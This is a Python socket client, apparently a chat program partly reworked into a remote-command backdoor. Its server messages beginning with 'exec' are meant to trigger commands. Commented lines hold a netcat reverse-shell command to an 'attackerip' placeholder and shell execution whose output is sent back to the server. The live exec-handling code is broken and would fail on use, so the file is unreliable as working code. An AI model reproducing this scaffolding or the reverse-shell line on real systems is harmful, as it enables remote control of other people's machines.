import socket, select, string, sys, os
from subprocess import *

#Helper function (formatting)
def display() :
	you=" You: "
	# sys.stdout.write()
	sys.stdout.flush()

def main():
	if len(sys.argv) < 3:
		print("error")
	else:
		host = sys.argv[1]
		name = str.encode(sys.argv[2])

	port = 5001
	#asks for user name
	# name=raw_input("\33[34m\33[1m CREATING NEW ID:\n Enter username: \33[0m")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	# s.settimeout(2)
	# connecting host
	try :
		s.connect((host, port))
	except :
		print("Can't connect to the server")
		sys.exit()

#if connected
	s.send(name)
	display()
	while 1:
		socket_list = [sys.stdin, s]

		# Get the list of sockets which are readable
		rList, wList, error_list = select.select(socket_list , [], [])


		for sock in rList:
			if sock == s:
				data = (sock.recv(4096)).decode('utf-8')
				if not data :
					print('DISCONNECTED!!')
					sys.exit()
				else :
					resp = data.split(" ")
					if(resp[0] == "exec"):
						recv = resp[0].split("$")[1]
						# for i in resp:
						# 	if i[:3] != "exec":
						print(recv)
								# cmdstr = i + " "
						# print(cmdstr)
						# for i in range(1, resp[1:].__len__()):

						# print(cmdstr)
						# nc attackerip 4444 -e /bin/sh
						# command_stdout = Popen(['ls', '-la'], stdout=PIPE).communicate()[0]
						# print(command_stdout)
						# result = subprocess.check_output(, shell=True)

						# sys.stdout.flush()on
						# s.send(str(command_stdout).encode('utf-8'))
					# sys.stdout.write(data)
					# display()

		#user entered a message
			else :
				msg=sys.stdin.readline()
				s.send(str(msg).encode('utf-8'))
				# display()

if __name__ == "__main__":
	main()
